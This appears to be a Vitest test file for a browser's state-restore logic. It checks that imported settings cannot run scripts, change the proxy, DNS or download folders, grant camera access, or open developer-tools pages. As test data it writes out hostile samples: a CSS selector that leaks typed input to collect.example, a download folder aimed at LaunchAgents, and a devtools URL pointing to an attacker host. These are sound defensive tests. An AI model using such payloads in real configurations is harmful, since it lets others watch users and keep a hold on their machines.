import { describe, expect, it, vi } from 'vitest'
import { boostRunsScript, combineBoosts } from './boost'
import { STATE_VERSION } from './model'
import { createInitialState, readRestoredState, reduce, restoredState, type Ctx } from './sidebar'

const ctx: Ctx = { now: 1, newId: (() => { let n = 0; return () => `r${++n}` })() }
const saved = reduce(createInitialState(ctx), { type: 'tab/open', url: 'https://saved.example/' }, ctx)

describe('a state whose repair throws', () => {
  /** A state of this version whose folders cannot even be read: the repair fails on them. */
  const unreadable = (failure: Error): unknown => {
    const state = JSON.parse(JSON.stringify(createInitialState({ now: 1, newId: () => 'a' }))) as Record<string, unknown>
    Object.defineProperty(state, 'folders', { enumerable: true, get: () => { throw failure } })
    return state
  }

  it('is refused with the error, which restoredState writes to the log before it answers null', () => {
    const failure = new Error('folders cannot be read')
    expect(readRestoredState(unreadable(failure))).toEqual({ ok: false, error: failure })
    const logged = vi.spyOn(console, 'error').mockImplementation(() => {})
    try {
      expect(restoredState(unreadable(failure))).toBeNull()
      expect(logged).toHaveBeenCalledTimes(1)
      expect(logged.mock.calls[0]).toEqual(['[state] a state to restore could not be repaired:', failure])
      // A value that is no state at all is refused without a line: nothing failed.
      expect(restoredState(null)).toBeNull()
      expect(readRestoredState({ version: -1 })).toEqual({ ok: false })
      expect(logged).toHaveBeenCalledTimes(1)
    } finally {
      logged.mockRestore()
    }
  })
})

describe('restoredState', () => {
  it('accepts a state of this version, as it comes back from JSON, and repairs it', () => {
    const fromFile = JSON.parse(JSON.stringify(saved)) as typeof saved
    fromFile.activeSpaceId = 'gone'
    const state = restoredState(fromFile)!
    expect(state.tabs.map((t) => t.url)).toEqual(['https://saved.example/'])
    expect(state.activeSpaceId).toBe(saved.spaces[0]!.id)
  })

  it('refuses what is not a usable state instead of replacing the real one with it', () => {
    const bad: unknown[] = [null, 'text', 3, [], {}, { ...saved, version: STATE_VERSION + 1 }, { ...saved, spaces: [] }, { ...saved, tabs: 'no' }, { ...saved, spaces: [null] }, { ...saved, tabs: [null] }]
    for (const value of bad) expect(restoredState(value), JSON.stringify(value)?.slice(0, 50)).toBeNull()
  })
})

describe('the state/restore action', () => {
  it('replaces the whole state with the restored one', () => {
    const current = reduce(createInitialState(ctx), { type: 'tab/open', url: 'https://current.example/' }, ctx)
    const next = reduce(current, { type: 'state/restore', state: JSON.parse(JSON.stringify(saved)) }, ctx)
    expect(next.tabs.map((t) => t.url)).toEqual(['https://saved.example/'])
  })

  it('brings a Tweak back with its script waiting, as boost/import does (a file from elsewhere decides nothing about what runs)', () => {
    const boost = { name: 'Script', host: 'example.com', enabled: true, css: 'body { color: red }', js: 'document.title = "x"', zoom: 1, zap: [], tint: null }
    const withBoosts = reduce(saved, { type: 'boost/save', boost: { ...boost, id: 'b1' } } as never, ctx)
    // A second one keeps its stylesheet only: nothing to hold back.
    const both = reduce(withBoosts, { type: 'boost/save', boost: { ...boost, id: 'b2', js: '   ' } } as never, ctx)
    expect(boostRunsScript(both.boosts.find((b) => b.id === 'b1')!)).toBe(true)
    const next = reduce(createInitialState(ctx), { type: 'state/restore', state: JSON.parse(JSON.stringify(both)) }, ctx)
    const script = next.boosts.find((b) => b.id === 'b1')!
    expect(script.js).toBe('document.title = "x"')
    expect(script.jsEnabled).toBe(false)
    expect(boostRunsScript(script)).toBe(false)
    expect(combineBoosts(next.boosts).scripts).toEqual([])
    // Its stylesheet still applies, and a Tweak with no script is left as it was.
    expect(combineBoosts(next.boosts).css).toContain('color: red')
    expect(next.boosts.find((b) => b.id === 'b2')).not.toHaveProperty('jsEnabled')
  })

  // A style sheet fetches and reads too: an address to load with a selector on what is typed is how a file from elsewhere would watch a site.
  it('brings a Tweak back switched off when its CSS would be refused to a shared Tweak, its text kept', () => {
    const boost = { name: 'Styles', host: 'bank.example', enabled: true, css: 'body { color: red }', js: '', zoom: 1, zap: [], tint: null }
    const plain = reduce(saved, { type: 'boost/save', boost: { ...boost, id: 'b1' } } as never, ctx)
    const fetching = 'input[value^="a"] { background: url(https://collect.example/a) }'
    const both = reduce(plain, { type: 'boost/save', boost: { ...boost, id: 'b2', css: fetching } } as never, ctx)
    expect(both.boosts.find((b) => b.id === 'b2')!.enabled).toBe(true)
    const next = reduce(createInitialState(ctx), { type: 'state/restore', state: JSON.parse(JSON.stringify(both)) }, ctx)
    expect(next.boosts.find((b) => b.id === 'b1')!.enabled).toBe(true)
    const held = next.boosts.find((b) => b.id === 'b2')!
    expect(held.enabled).toBe(false)
    expect(held.css).toBe(fetching)
    // What the shell applies: the Tweaks that are on (browser-site.ts).
    expect(combineBoosts(next.boosts.filter((b) => b.enabled)).css).toBe('body { color: red }')
  })

  it('leaves the state alone when what it is given is not a state', () => {
    expect(reduce(saved, { type: 'state/restore', state: { version: STATE_VERSION } as never }, ctx)).toBe(saved)
  })
})

// A file of an earlier version could name an online provider for the summary, with its consents and its model names.
describe('a restored file that named an online provider for the summary', () => {
  const withOld = (old: Record<string, unknown>) => {
    const fromFile = JSON.parse(JSON.stringify(saved)) as typeof saved
    fromFile.settings = { ...fromFile.settings, aiSummary: true, ...old } as typeof saved.settings
    return restoredState(fromFile)!.settings as unknown as Record<string, unknown>
  }

  it('gets the summary switched off, and keeps none of the settings of the providers', () => {
    const settings = withOld({ aiProvider: 'openai', aiCloudAllowed: ['openai'], aiModels: { openai: 'gpt-4o-mini' } })
    expect(settings['aiSummary']).toBe(false)
    for (const key of ['aiProvider', 'aiCloudAllowed', 'aiModels']) expect(settings, key).not.toHaveProperty(key)
  })

  it('keeps the summary on when the file named the local model', () => {
    const settings = withOld({ aiProvider: 'ollama', aiCloudAllowed: ['mistral'], aiModels: {} })
    expect(settings['aiSummary']).toBe(true)
    for (const key of ['aiProvider', 'aiCloudAllowed', 'aiModels']) expect(settings, key).not.toHaveProperty(key)
  })
})

describe('what a restored file does not decide', () => {
  const fresh = () => createInitialState(ctx)
  const fileOf = (state: unknown) => JSON.parse(JSON.stringify(state)) as ReturnType<typeof fresh>

  it('neither where downloads go, nor the folder of the translation models, nor the proxy, nor the DNS: those stay this installation’s', () => {
    const base = fresh()
    const here = {
      ...base,
      settings: {
        ...base.settings,
        translateModelsDir: '/Users/moi/Modeles',
        proxyEnabled: false,
        dohCustom: true,
        dohMode: 'secure' as const,
        dohProvider: 'custom',
        dohCustomUrl: 'https://dns.ici.example/dns-query',
        profiles: { default: { downloadDir: '/Users/moi/Downloads', searchSuggestions: true }, travail: { proxy: { mode: 'direct' as const, address: '', bypass: '' } } }
      }
    }
    const file = fileOf({
      ...base,
      settings: {
        ...base.settings,
        translateModelsDir: '/Users/moi/Library/LaunchAgents',
        proxyEnabled: true,
        proxy: { mode: 'manual', address: 'http://proxy.ailleurs.example:8080', bypass: '' },
        dohCustom: true,
        dohMode: 'secure',
        dohProvider: 'custom',
        dohCustomUrl: 'https://dns.ailleurs.example/dns-query',
        profiles: {
          default: { downloadDir: '/Users/moi/Library/LaunchAgents', searchSuggestions: false, proxy: { mode: 'manual', address: 'http://proxy.ailleurs.example:8080', bypass: '' } },
          travail: { downloadDir: '/tmp/ailleurs', historyOff: true }
        }
      }
    })
    // The file is read as it says: the loader keeps these values, so the reducer is what holds them back.
    expect(restoredState(file)!.settings.profiles['default']!.downloadDir).toBe('/Users/moi/Library/LaunchAgents')
    expect(restoredState(file)!.settings.proxy.address).toBe('http://proxy.ailleurs.example:8080')
    const { settings } = reduce(here, { type: 'state/restore', state: file }, ctx)
    expect(settings.translateModelsDir).toBe('/Users/moi/Modeles')
    expect([settings.proxyEnabled, settings.proxy]).toEqual([false, here.settings.proxy])
    expect([settings.dohCustom, settings.dohMode, settings.dohProvider, settings.dohCustomUrl]).toEqual([true, 'secure', 'custom', 'https://dns.ici.example/dns-query'])
    // The other choices of a profile come from the file; its folder and its proxy are the ones it had here, or none.
    expect(settings.profiles).toEqual({ default: { downloadDir: '/Users/moi/Downloads', searchSuggestions: false }, travail: { historyOff: true, proxy: { mode: 'direct', address: '', bypass: '' } } })
    expect(JSON.stringify(settings)).not.toMatch(/ailleurs|LaunchAgents/)
  })

  it('nor which site may use the camera or the microphone: a refusal of the file is kept, an « allow » only where this installation gave the same', () => {
    const base = fresh()
    const container = { id: 'perso', name: 'Perso', color: base.settings.containers[0]?.color ?? ('blue' as never) }
    const here = {
      ...base,
      sitePermissions: { 'https://visio.example': { media: 'allow' as const, notifications: 'allow' as const } },
      settings: { ...base.settings, containers: [{ ...container, permissions: { 'https://visio.example': { media: 'allow' as const } } }] }
    }
    const fromElsewhere = {
      'https://visio.example': { media: 'allow', geolocation: 'allow', notifications: 'deny' },
      'https://espion.example': { media: 'allow', geolocation: 'allow' },
      'https://bruyant.example': { notifications: 'deny' },
      '*': { notifications: 'allow', midi: 'deny' }
    }
    const file = fileOf({ ...base, sitePermissions: fromElsewhere, settings: { ...base.settings, containers: [{ ...container, permissions: fromElsewhere }, { ...container, id: 'autre', name: 'Autre', permissions: { 'https://espion.example': { media: 'allow' } } }] } })
    expect(restoredState(file)!.sitePermissions['https://espion.example']).toEqual({ media: 'allow', geolocation: 'allow' })
    const next = reduce(here, { type: 'state/restore', state: file }, ctx)
    const expected = { 'https://visio.example': { media: 'allow', notifications: 'deny' }, 'https://bruyant.example': { notifications: 'deny' }, '*': { midi: 'deny' } }
    expect(next.sitePermissions).toEqual(expected)
    const [first, second] = next.settings.containers
    // A container has no answer for every site: the loader had dropped that one.
    expect(first!.permissions).toEqual({ 'https://visio.example': { media: 'allow', notifications: 'deny' }, 'https://bruyant.example': { notifications: 'deny' } })
    expect(second).not.toHaveProperty('permissions')
  })

  it('nor a tab, a favourite or an archive entry on the developer tools’ own pages, however the address is written; local files and the rest come back', () => {
    const tools = 'devtools://devtools/bundled/devtools_app.html?ws=attaquant.example/x'
    let state = reduce(saved, { type: 'tab/open', url: 'file:///Users/moi/page.html' }, ctx)
    state = reduce(state, { type: 'tab/open', url: 'https://garde.example/' }, ctx)
    const template = state.tabs[0]!
    const file = fileOf(state)
    file.tabs.push({ ...template, id: 'outil', url: tools }, { ...template, id: 'outil-2', url: ` DevTools://devtools/bundled/inspector.html` }, { ...template, id: 'outil-3', url: `view-source:${tools}` }, { ...template, id: 'ancre', url: 'https://ancre.example/', anchorUrl: tools })
    file.activeTabBySpace[template.spaceId] = 'outil'
    file.favorites.push({ id: 'fav-outil', url: tools, title: 'Outils' } as never, { id: 'fav', url: 'https://favori.example/', title: 'Favori' } as never)
    // The loader takes these addresses (a tab of this installation may hold one): the restoration is what leaves them out.
    expect(restoredState(file)!.tabs.map((t) => t.id)).toContain('outil')
    const next = reduce(fresh(), { type: 'state/restore', state: file }, ctx)
    expect(JSON.stringify(next).toLowerCase()).not.toContain('devtools:')
    expect(next.tabs.map((t) => t.url).sort()).toEqual(['file:///Users/moi/page.html', 'https://ancre.example/', 'https://garde.example/', 'https://saved.example/'])
    expect(next.tabs.find((t) => t.id === 'ancre')).not.toHaveProperty('anchorUrl')
    expect(next.favorites.map((f) => f.url)).toEqual(['https://favori.example/'])
    expect(next.activeTabBySpace[template.spaceId]).not.toBe('outil')
  })
})
